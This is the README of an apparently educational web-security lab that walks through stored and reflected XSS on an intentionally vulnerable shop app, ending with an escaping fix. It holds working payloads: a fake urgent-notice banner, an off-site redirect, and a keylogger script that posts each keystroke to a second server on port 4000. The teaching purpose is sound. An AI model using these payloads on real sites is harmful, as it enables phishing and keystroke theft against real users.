# XSS (chapter 5)

Member shop continuation from **[PathTraversal](../PathTraversal/)** (chapter 4, port **3003**). Chapter download still works (safe path); this lab adds **Stored XSS** on opinions and **Reflected XSS** on library **Search** (`GET /members?q=…`, CWE-79). App port **3004**.

- **Port:** `3004`
- **Accounts:** `marc` / `marc123`, `ewa` / `ewa123` (admin)
- **Stack:** Express + TypeScript, in-memory SQLite (`server/sql/init.sql`). Restarting `npm run dev` clears sessions, purchases, and opinions.

## Run

```bash
cd server
npm install
npm run dev
```

Open **`http://localhost:3004/login`**.

## Layout

```text
XSS/
  README.md
  server/
    src/comments.ts           # USE_SAFE_HTML; opinions + search line
    src/routes/members.ts     # GET /members?q=, POST /comments
    pages/members.html        # search form, <!-- CATALOG -->
    src/catalog.ts            # static titles; filter by q
  key-receiver/               # exercise 4 — POST /key on port 4000
```

| Request | Meaning |
|---------|---------|
| `POST /comments` | Save the signed-in login and `body`, then redirect to `/members` |
| `GET /members` | Library page; opinions are inserted into the HTML |
| `GET /members?q=…` | Filters the catalog; line `Showing results for: …` is reflected (not stored) |

The catalog is shown as cards with cover art (or initials). Only **Gone with the Wind** includes purchase and chapter download.

`USE_SAFE_HTML` in [`server/src/comments.ts`](server/src/comments.ts) controls escaping for opinions and the search line.

## Prerequisite

**CWE-79** (Improper Neutralization of Input During Web Page Generation).

The session cookie is `HttpOnly`, same as the shop. One browser holds one session, so the other account is a sign-out, not a second tab.

Sign in as `marc` / `marc123`. On `/members`, post `świetna książka`.

Sign out. Sign in as `ewa` / `ewa123`. The same sentence is on `/members`, under **marc**. It was stored, not carried only in the URL.

## Exercises

### 1. HTML

Sign in as `marc`. In **Opinion**, submit:

```html
<b>tu jest HTML</b>
```

Sign in as `ewa`. The words are bold. The server pasted `body` into the HTML instead of showing the angle brackets.

### 2. A script for the next reader

Sign in as `marc`. In **Opinion**, submit:

```html
<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<p class=shop-notice--urgent role=alert>Urgent: confirm your account at https://support.member-shop.invalid</p>')">
```

Sign in as `ewa`. A red **urgent** banner appears at the top of `/members` when the page loads. The script runs as this origin (`localhost:3004`) and changes what the next reader sees.

**Debrief:** Try `document.cookie` in the console (or a one-line script) — the `session` cookie is not visible. It is `HttpOnly`, as in the [Cookies](../Cookies/) lab. The fake banner still runs; HttpOnly limits what script can read, not whether script can run.

### 3. Redirect the next reader

Sign in as `marc`. In **Opinion**, submit:

```html
<script>
document.location = "https://www.google.com/";
</script>
```

Sign out. Sign in as `ewa`. Opening `/members` leaves the shop. The address bar is `https://www.google.com/`.

### 4. Keys sent to another server

Restart the shop (`npm run dev`) so the redirect from exercise 3 is gone.

In a second terminal, start the key receiver on port **4000** (not the shop):

```bash
cd key-receiver
npm install
npm start
```

Sign in as `marc`. In **Opinion**, submit:

```html
<script>
document.onkeypress = function (e) {
  fetch("http://localhost:4000/key", { method: "POST", body: e.key });
};
</script>
```

Sign out. Sign in as `ewa`. Click **Opinion** and type `ewa`.

The receiver prints `e`, then `w`, then `a`. The shop does not receive those letters. The stored opinion sends them with `POST /key`.

### 5. Reflected HTML in the search box (same payload as exercise 1)

Search uses `GET /members?q=…`. The server filters titles in the catalog, prints `Showing results for: …`, and does **not** save `q`. The search box keeps `q` in its `value` attribute with attribute escaping; this exercise targets the results line in the HTML body, not the input.

Sign in as `ewa`. Search for `Austen` — you should see **Pride and Prejudice** (one hit) and `Showing results for: Austen`. Restart `npm run dev`, sign in again: that search is gone (not in the database).

While signed in, set **Search the library** to the same payload as exercise **1**:

```html
<b>tu jest HTML</b>
```

Click **Search**. The words in `Showing results for: …` are **bold** — the server pasted `q` into the HTML instead of showing the angle brackets. Copy the URL from the address bar and open it while signed in; without `q` in the URL, the formatting does not appear.

**Debrief:** Stored XSS on `/members` affects every later visitor. Reflected XSS needs `q` in the link or in one search submit. DOM XSS from the slides is not implemented in this lab.

### 6. Enable the escape (uncomment)

At the top of [`server/src/comments.ts`](server/src/comments.ts), find `USE_SAFE_HTML`:

1. Comment out: `const USE_SAFE_HTML = false;`
2. Uncomment: `// const USE_SAFE_HTML = true;`
3. Restart `npm run dev` (in-memory opinions are cleared).

Repeat exercise **2**, **3**, or **4**, and **5**. Expected: payloads are visible as text. There is no fake banner, `/members` stays on port **3004**, and the receiver prints no keys. The prerequisite sentence still shows as plain text.

The escape replaces `&`, `<`, `>`, and `"` in opinions and in the search line.

## Next steps

**Previous:** PathTraversal — chapter download and CWE-22.

**Next module — [FileUpload](../FileUpload/)** (chapter 6, port **3005**): same shop plus **profile photo upload** on `/account` (CWE-434).